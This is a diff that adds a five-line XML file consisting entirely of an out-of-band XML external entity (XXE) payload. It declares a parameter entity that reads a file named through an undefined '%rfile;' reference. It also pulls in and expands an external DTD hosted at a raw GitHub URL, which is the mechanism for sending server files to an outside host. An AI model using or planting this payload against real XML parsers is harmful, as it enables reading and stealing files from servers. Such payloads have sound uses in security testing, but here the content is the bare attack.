@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+ <!ENTITY % file SYSTEM "%rfile;">
+ <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/qfalconer/hosting/main/dtd5.xml"> 
+%dtd;
+
